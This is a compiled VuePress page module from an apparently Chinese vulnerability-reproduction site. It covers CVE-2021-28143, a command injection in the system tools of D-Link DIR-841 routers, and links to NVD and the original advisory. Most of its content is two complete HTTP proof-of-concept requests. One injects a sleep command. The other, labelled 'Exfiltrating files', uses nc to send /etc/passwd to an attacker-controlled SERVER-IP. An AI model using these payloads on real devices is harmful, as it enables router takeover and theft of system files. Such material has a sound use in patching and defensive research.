import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as u,c as a,a as e,b as t,d as i,e as d}from"./app-58e4a7d6.js";const r={},l=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),t(" 漏洞描述")],-1),c=e("p",null,"D-Link DIR-841 3.03和3.04 存在经过身份验证的命令注入，通过“系统工具”（ping/ping6/traceroute）命令注入，可导致攻击者进行完全控制设备。",-1),q=e("p",null,"参考链接：",-1),v={href:"https://nvd.nist.gov/vuln/detail/CVE-2021-28143",target:"_blank",rel:"noopener noreferrer"},m={href:"https://github.com/vitorespf/Advisories/blob/master/DLINK-DIR-841-command-injection.txt",target:"_blank",rel:"noopener noreferrer"},p=d(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /jsonrpc HTTP/1.1
Host: IP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: application/json, text/plain, */*
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Authorization: Digest username=&quot;admin&quot;, realm=&quot;domain&quot;, nonce=&quot;4784226&quot;, uri=&quot;/jsonrpc&quot;, response=&quot;84799b55020cf2c53e28214e3d60b899&quot;, qop=auth, nc=00000035, cnonce=&quot;bPzBB3mcvSb51Ijx&quot;
Content-Length: 156
Origin: IP
Connection: close
Referer: http://ip-address:9821/admin/index.html
Cookie: user_ip=0.0.0.0; device_mode=router; user_login=admin; device-session-id=&lt;session&gt;

{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;write&quot;,&quot;params&quot;:{&quot;id&quot;:166,&quot;data&quot;:{&quot;host&quot;:&quot;&#39;127.0.0.1 &amp; sleep 5&#39;&quot;,&quot;count&quot;:1,&quot;is_ipv6&quot;:false,&quot;max_ttl&quot;:30,&quot;nqueries&quot;:2,&quot;waittime&quot;:3},&quot;save&quot;:true},&quot;id&quot;:757}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Exfiltrating files：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /jsonrpc HTTP/1.1
Host: IP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: application/json, text/plain, */*
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Authorization: Digest username=&quot;admin&quot;, realm=&quot;domain&quot;, nonce=&quot;4784226&quot;, uri=&quot;/jsonrpc&quot;, response=&quot;84799b55020cf2c53e28214e3d60b899&quot;, qop=auth, nc=00000035, cnonce=&quot;bPzBB3mcvSb51Ijx&quot;
Content-Length: 156
Origin: IP
Connection: close
Referer: http://ip-address:9821/admin/index.html
Cookie: user_ip=0.0.0.0; device_mode=router; user_login=admin; device-session-id=&lt;session&gt;

{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;write&quot;,&quot;params&quot;:{&quot;id&quot;:166,&quot;data&quot;:{&quot;host&quot;:&quot;&#39;127.0.0.1 &amp; nc SERVER-IP 1234 &lt; /etc/passwd&#39;&quot;,&quot;count&quot;:1,&quot;is_ipv6&quot;:false,&quot;max_ttl&quot;:30,&quot;nqueries&quot;:2,&quot;waittime&quot;:3},&quot;save&quot;:true},&quot;id&quot;:757}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,5);function b(_,h){const n=s("ExternalLinkIcon");return u(),a("div",null,[l,c,q,e("ul",null,[e("li",null,[e("a",v,[t("https://nvd.nist.gov/vuln/detail/CVE-2021-28143"),i(n)])]),e("li",null,[e("a",m,[t("https://github.com/vitorespf/Advisories/blob/master/DLINK-DIR-841-command-injection.txt"),i(n)])])]),p])}const f=o(r,[["render",b],["__file","D-Link DIR-841 命令注入漏洞 CVE-2021-28143.html.vue"]]);export{f as default};
